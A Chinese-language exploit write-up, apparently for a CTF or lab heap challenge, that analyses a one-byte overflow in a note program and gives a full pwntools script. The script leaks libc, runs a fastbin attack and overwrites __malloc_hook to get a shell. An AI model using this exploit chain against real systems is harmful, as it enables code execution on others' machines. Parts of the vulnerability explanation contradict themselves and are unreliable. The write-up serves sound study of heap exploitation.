# 漏洞利用文档

## 执行环境
基于程序反编译代码和exp分析，程序的执行环境如下：
- **二进制类型**：64位ELF程序，动态链接（使用libc）
- **安全保护**：
  - Partial RELRO：全局偏移表可写
  - Stack Canary：启用（代码中有`__readfsqword(0x28u)`）
  - NX：启用（不可执行堆栈）
  - PIE：未启用（全局变量地址固定，如0x202060）
- **依赖库**：标准libc（exp中使用`elf.libc`获取）
- **运行要求**：本地运行，需要相应的libc版本匹配

## 漏洞成因
### 关键结构体分析
程序使用全局变量管理笔记系统：
- `unk_202040`（0x202040）：当前笔记大小
- `unk_202060`（0x202060）：名字缓冲区（0x30字节）
- `qword_202090`（0x202090）：当前笔记指针

### 漏洞类型与成因
1. **1字节堆溢出漏洞**：
   - 位置：`sub_C60()`函数（update name功能）
   - 成因：该函数使用`read(0, &unk_202060, 0x31u)`读取0x31字节数据到0x30字节的缓冲区，导致1字节溢出
   - 影响：溢出可覆盖相邻的`qword_202090`（笔记指针）的低字节

2. **Use-After-Free (UAF) 漏洞**：
   - 位置：`sub_BB1()`函数（delete note功能）
   - 成因：释放堆块后，指针被置为NULL，但堆块未被立即重用，形成悬空指针
   - 条件：当笔记指针被错误修改时，实际堆块仍分配但程序无法正确引用

3. **组合利用**：
   - 1字节溢出修改笔记指针指向错误位置
   - UAF使得堆块可被重新分配利用
   - 通过精心控制的堆操作实现任意地址读写

## 漏洞利用过程
### 内存变化时序表
| 步骤 | 操作 | 堆状态变化 | 全局变量变化 | 关键内存地址变化 |
|------|------|------------|--------------|------------------|
| 1 | 写入名字缓冲区 | 无堆活动 | 名字缓冲区填充`b'a'*0x30` | 无溢出，缓冲区完整 |
| 2 | 添加两个堆块(0x80, 0x10) | 分配两个连续堆块 | 笔记指针指向第二个堆块(0x...f0a0) | 堆布局：0x...f000(0x80), 0x...f090(0x10) |
| 3 | update名字(1字节溢出) | 堆元数据不变 | 笔记指针低字节从0xa0→0x10 | 指向第一个堆块内部(0x...f010) |
| 4 | 删除笔记 | 第一个堆块释放到unsortedbin | 笔记指针置NULL | 第二个堆块成为UAF块 |
| 5 | 重新分配堆块 | 第一个堆块前0x20字节被重用 | 笔记指针被溢出覆盖为0x...f030 | 指向unsortedbin的fd指针 |
| 6 | 显示笔记泄露libc | 堆布局不变 | 读取unsortedbin的fd获取main_arena | libc基址计算：泄露地址 - (0x3c4b20 + 0x58) |
| 7-8 | 堆风水布局 | 分配多个堆块，形成fastbins | 笔记指针保持错误指向 | 准备fastbins攻击 |
| 9-11 | fastbins链构造 | 修改fastbins块fd指针 | 笔记指针指向libc内存 | fd指向__malloc_hook - 0x23 |
| 12 | 触发fastbins分配 | fastbins块被分配 | 笔记指针重定向到libc | 指向__malloc_hook - 0x13 |
| 13 | 覆盖__malloc_hook | libc hook区域被写入 | 通过笔记指针写入payload | __malloc_hook覆盖为realloc+12 |
| 14 | 触发malloc | 调用__malloc_hook | 执行one_gadget | 成功获取shell |

### 关键内存状态演变
1. **初始状态**：
   - 堆：未分配
   - 全局变量：名字缓冲区空，笔记指针NULL

2. **攻击准备阶段**（步骤1-4）：
   - 通过1字节溢出错误修改笔记指针
   - 创建UAF条件：第二个堆块(0x10)分配但程序丢失引用

3. **信息泄露阶段**（步骤5-6）：
   - 利用错误指向的笔记指针读取unsortedbin的fd
   - 泄露main_arena地址，计算libc基址

4. **利用阶段**（步骤7-14）：
   - 通过fastbins攻击将堆分配重定向到libc
   - 覆盖__malloc_hook为one_gadget地址
   - 触发malloc调用获取shell

## Exploit
```python
from pwn import *
from pwncli import one_gadget

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample15')
elf = ELF('./data/sample15')
libc = elf.libc
choice_words = '6.exit\n'
menu_add = 1
add_index_words = ''
add_size_words = 'Input the size\n'
add_content_words = ''
menu_del = 2
del_index_words = ''
menu_show = 3
show_index_words = ''
menu_edit = 5
edit_index_words = ''
edit_size_words = ''
edit_content_words = 'Input the note\n'
one_gadget = 0x4527a  # one_gadget偏移，需要根据实际libc调整

def add(index=-1, size=-1, content=''):
    p.sendlineafter(choice_words, str(menu_add))
    if add_index_words:
        p.sendlineafter(add_index_words, str(index))
    if add_size_words:
        p.sendlineafter(add_size_words, str(size))
    if add_content_words:
        p.sendafter(add_content_words, content)

def delete(index=-1):
    p.sendlineafter(choice_words, str(menu_del))
    if del_index_words:
        p.sendlineafter(del_index_words, str(index))

def show(index=-1):
    p.sendlineafter(choice_words, str(menu_show))
    if show_index_words:
        p.sendlineafter(show_index_words, str(index))

def edit(index=-1, size=-1, content=''):
    p.sendlineafter(choice_words, str(menu_edit))
    if edit_index_words:
        p.sendlineafter(edit_index_words, str(index))
    if edit_size_words:
        p.sendlineafter(edit_size_words, str(size))
    if edit_content_words:
        p.sendafter(edit_content_words, content)

def update(content):
    p.sendlineafter(choice_words, '4')
    p.sendafter('input your name\n', content)

# Step 1: 初始化名字缓冲区，填充但不溢出
p.recv()
payload = b'a'*0x30
p.send(payload)

# Step 2: 分配两个堆块，创建堆布局
add(size=0x80)  # 第一个堆块，用于后续释放泄露libc
add(size=0x10)  # 第二个堆块，形成UAF

# Step 3: 利用1字节溢出修改笔记指针低字节
update(content=b'a'*0x30 + p8(0x10))  # 溢出覆盖指针从0xa0→0x10

# Step 4: 删除笔记，释放第一个堆块到unsortedbin，创建UAF
delete()

# Step 5: 重新分配堆块并再次溢出调整指针
add(size=0x10)
update(content=b'a'*0x30 + p8(0x30))  # 调整指针指向unsortedbin的fd

# Step 6: 显示笔记泄露libc地址
show()
libc_leak = u64(p.recv(6).ljust(8, b'\x00'))
libc.address = libc_leak - (0x3c4b20 + 0x58)  # 计算libc基址

# Step 7-8: 堆风水，准备fastbins攻击
add(size=0x60)
add(size=0x40)
add(size=0x60)
delete()  # 释放堆块到fastbins

# Step 9-11: 构造fastbins链指向__malloc_hook
add(size=0x10)
update(content=b'a'*0x30 + p8(0x10))  # 确保指针正确
edit(content=p64(libc.sym['__malloc_hook'] - 0x23))  # 修改fastbins fd指针

# Step 12: 触发fastbins分配，重定向到libc
add(size=0x60)  # 分配触发fastbins链
add(size=0x60)  # 分配到__malloc_hook附近

# Step 13: 覆盖__malloc_hook为one_gadget
edit(content=b'a'*(0x13 - 0x8) + p64(libc.address + one_gadget) + p64(libc.sym['realloc'] + 12))

# Step 14: 触发malloc调用__malloc_hook，获取shell
add(size=0x50)  # 触发malloc，执行one_gadget

# 交互模式，获得shell控制
p.interactive()
```

### 关键注释说明
- **one_gadget偏移**：需要根据实际libc版本调整，可通过`one_gadget`工具获取
- **libc计算**：`0x3c4b20 + 0x58`是main_arena相对于libc基址的偏移，需适配目标libc
- **fastbins攻击**：通过修改fd指针控制后续分配地址，实现任意地址写
- **hook覆盖**：结合one_gadget和realloc调整栈帧，提高利用成功率
- **交互模式**：成功获取shell后进入交互式命令行

该漏洞利用成功结合了1字节溢出和UAF漏洞，通过精妙的堆布局和fastbins攻击实现了从内存破坏到代码执行的完整利用链。
